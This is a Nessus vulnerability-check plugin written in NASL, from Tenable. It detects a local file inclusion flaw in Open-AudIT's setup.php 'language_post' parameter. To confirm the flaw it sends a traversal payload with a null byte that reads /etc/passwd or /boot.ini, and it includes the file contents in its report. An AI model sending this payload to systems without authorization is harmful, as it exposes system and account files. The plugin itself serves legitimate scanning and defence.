#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(46701);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 23:21:18 $");

  script_bugtraq_id(40315);
  script_xref(name:"EDB-ID", value:"12676");

  script_name(english:"Open-AudIT include_lang.php language Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is prone to a local
file inclusion attack."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The web server hosts Open-AudIT, an open source network auditing
application written in PHP. 

At least one install of Open-AudIT on the remote host fails to
sanitize user-supplied input to the 'language' parameter before using
it in 'include_lang.php' to include PHP code. 

Regardless of PHP's 'register_globals' setting, an unauthenticated
remote attacker can leverage this issue to view arbitrary files or
possibly execute arbitrary PHP code on the remote host, subject to 
the privileges of the web server user id.

Note that any reported installs of Open-AudIT are likely to be
affected by several other vulnerabilities, including SQL injection,
authentication bypass, and cross-site scripting, although Nessus has
not tested for those."
  );
   # http://www.gardienvirtuel.ca/wp-content/uploads/2010/05/GVI-2010-02-EN.txt
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?d939c41c"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value: "2010/05/21");
  script_set_attribute(attribute:"plugin_publication_date", value: "2010/05/24");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:open-audit:open-audit");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, php:TRUE);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

traversal = crap(data:"../", length:3*9) + '..';

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/openaudit", "/open-audit", "/open_audit", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
found_app = FALSE;
found_file = "";
poc = "";
vuln_urls = make_array();

foreach dir (dirs)
{
  # Make sure setup.php exists.
  url = dir + '/setup.php';
  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

  if (
    res[2] && 
    '<title>Open-AudIT Setup' >< res[2] &&
    'name="language_post"' >< res[2] &&
    'name="step"' >< res[2]
  ) found_app = TRUE;
  else continue;

  # Loop through files to look for.
  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    # Try to exploit the issue.
    exploit = traversal + file;
    postdata = 
      'language_post=' + urlencode(str:exploit) + "%00" + '&' +
      'step=2';

    req = http_mk_post_req(
      port        : port,
      item        : url, 
      data        : postdata,
      add_headers : make_array(
        "Content-Type", "application/x-www-form-urlencoded"
      )
    );
    res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

    # It's a problem if the exploit was successful.
    body = res[2];
    file_pat = file_pats[file];
    if (body && egrep(pattern:file_pat, string:body))
    {
      # nb: track the latest successful PoC.
      poc = req;
      vuln_urls[url]++;

      if (!contents && egrep(pattern:file_pat, string:body))
      {
        found_file = file;

        contents = body;
        if ("<!DOCTYPE" >< contents) contents = contents - strstr(contents, "<!DOCTYPE");
        break;
      }
    }
  }

  # It's also a problem if we weren't successful but saw an error 
  # because is_file() failed.
  #
  # nb: this could be because magic_quotes_gpc is enabled, 
  #     open_basedir prevents access to the file, or
  #     the file simply doesn't exist.
  if (
    body && 
    'Language-File not found: ./lang/'+traversal+file >< body &&
    !egrep(pattern:file_pat, string:body)
  )
  {
    # nb: if we already don't have a PoC, use this.
    if (!poc) poc = req;
    vuln_urls[url]++;
  }

  if (poc && !thorough_tests) break;
}
if (!found_app) exit(0, "The web server listening on port "+port+" does not appear to host Open-AudIT.");
if (!poc) exit(0, "No vulnerable installs of Open-AudIT were found on the web server on port "+port+".");


# Report findings.
if (report_verbosity > 0)
{
  info = "";
  foreach url (keys(vuln_urls))
    info += "  - " + build_url(port:port, qs:url) + '\n';

  if (max_index(split(info)) > 1) s = "s are";
  else s = " is";

  report = '\n' +
    'Nessus determined that the following URL' + s + ' vulnerable :\n' +
    '\n' +
    info;

  if (contents)
  {
    if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

    report += '\n' +
      'Specifically, it was able to exploit the issue to retrieve the\n' +
      "contents of '" + found_file + "' on the remote host using a request such as" + '\n' +
      'the following :\n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
      http_mk_buffer_from_req(req:poc) + '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1)
      report += '\n' +
        'Here are its contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  else
  {
    report += '\n' +
      'While Nessus was not able to exploit the issue, it was able to verify\n' +
      'the issue exists based on the error message from a request such as\n' +
      'the following :\n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
      http_mk_buffer_from_req(req:poc) + '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
